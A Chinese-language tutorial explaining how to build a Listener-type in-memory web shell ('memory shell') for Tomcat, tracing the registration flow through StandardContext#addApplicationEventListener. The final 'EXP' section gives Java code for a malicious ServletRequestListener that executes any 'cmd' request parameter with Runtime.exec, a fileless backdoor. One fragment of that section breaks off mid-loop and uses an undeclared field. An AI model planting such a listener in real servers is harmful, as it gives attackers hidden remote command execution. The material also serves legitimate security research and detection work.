    Java 内存马之 Listener 型内存马 #

    Listener 基础 #

    Java Web 开发中的监听器（Listener）就是 Application、Session、Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。

    用途 #

    可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动触发一些动作，比如监听在线的用户数量、统计网站访问量、网站访问监控等。

    Listener 三个域对象 #

    • ServletContextListener
    • HttpSessionListener
    • ServletRequestListener

    很明显，ServletRequestListener是最适合用来作为内存马的，因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。下面实现一个恶意的 Listener。

    Listener 基础代码实现 #

    和之前 Filter 型内存马的原理一样，之前我们说到 Filter 内存马需要定义一个实现 Filter 接口的类，Listener 也是一样的，要求 Listener 的业务对象要实现EventListener这个接口。

    我们可以先看看EventListener这个接口：

    它有非常多的实现类，那么如果我们需要实现内存马的话就需要找一个每个请求都会触发的 Listener，我们去寻找的时候一定是优先寻找 Servlet 开头的类。

    这里找到了ServletRequestListener，因为根据名字以及其中的requestInitialized()方法似乎我们发送的每个请求都会触发这个监听器。

    因为猜测requestInitialized()方法会触发 Listener 监听器，所以我们在requestInitialized()方法中加上一些代码，来证明它什么时候被执行。

    package com.solo.listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebServlet;

@WebServlet("/listenerTest")
public class ListenerTest implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        ServletRequestListener.super.requestDestroyed(sre);
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("Listener 被调用");
    }
}

    同样我们需要修改 web.xml，加上：

    <listener>
    <listener-class>com.solo.listener.ListenerTest</listener-class>
</listener>

    接着访问对应的路径即可，控制台会看到输出。

    接下来分析一下 Listener 的运行流程。

    Listener 流程分析 #

    流程分析的意义是让我们能够正确的写入恶意内存马，具体要解决的其实有两个问题：

    • 我们的恶意代码应该在哪编写
    • Tomcat 中的 Listener 是如何实现注册的

    应用开启前 #

    所以这里我们可以打个断点，然后往里看addApplicationListener()这个方法，这是一个接口的方法，我们去找它的实现方法：

    第一个FailedContext类中的addApplicationListener()方法里没有东西，所以去StandardContext中。

    接下来开始调试。

    一开始我们的第一步，直接获取到 web.xml：

    我们可以看到 webxml 中的 listener 已经有对应的 Listener 文件，继续向下，下一步应该是走到addApplicationListener()这里。

    读取完配置文件加载 Listener #

    当我们读取完配置文件，当应用启动时，StandardContext会去调用listenerStart()方法。这个方法负责实例化监听器，并触发应用的生命周期启动回调。

    刚开始的地方，listenerStart()方法中有这也一个语句：

    String listeners[] = findApplicationListeners();

    这里实际就是把之前的 Listener 存到这里来。

    应用运行过程 #

    我们从最开始重新调试，一般断点会下在requestInitialized()，但是在这调试时走进去的代码没有什么实际作用，真正的断点应该下在前面的一个方法：

    所以断点应该放在fireRequestInitEvent()方法中：

    开始调试，我们先跟进到getApplicationEventListeners()方法中。

    getApplicationEventListeners()方法就做了一件事：获取一个 Listener 数组。

    public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}

    看一下applicationEventListenersList是什么，可以看到 Listener 实际上是存储在applicationEventListenersList属性中的。

    并且我们可以通过StandardContext#addApplicationEventListener()来添加 Listener：

    public void addApplicationEventListener(Object listener) {
    applicationEventListenersList.add(listener);
}

    到这一步的调试就没什么东西了，所以这里的逻辑应该和 Filter 差不多，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。

    在 Listener 数组内的 Listener 会被逐个触发，最后到我们自定义的 Listener 的requestInitialized()方法中。

    运行流程小结 #

    在应用开始之前，先读取了 web.xml，从中读取到 Listeners，并进行加载，加载完毕后会进行逐个读取，对每一个 Listener 都会调用到requestInitialized()方法中。

    Listener 型内存马 EXP #

    EXP 分析 #

    如果我们要实现 EXP，需要实现以下步骤：

    • 我们的恶意代码要写在requestInitialized()方法中。
    • 通过StandardContext类的addApplicationEventListener()方法把恶意的 Listener 放进去。

    Listener 与 Filter 的大致流程是一样的，所以我们也可以把 Listener 先放到整个 Servlet 最前面去。

    这就是最基础的两步了，如果排先后顺序的话一定是先获取StandardContext类，再通过addApplicationEventListener()方法把恶意的 Listener 注册进去，我们可以用流程图看一下运行流程。

    EXP 编写 #

    先编写恶意代码：

    String cmd;
try {
	cmd = sre.getServletRequest().getParameter("cmd");
	org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();

	requestField.setAccessible(true);
	Request request = (Request) requestField.get(requestFacade);
	Response response = request.getResponse();

	if (cmd != null){
		InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
		int i = 0;

		while ((i=inputStream.read(bytes)) != -1){

    public class Shell_Listener implements ServletRequestListener {
 
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }
 
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
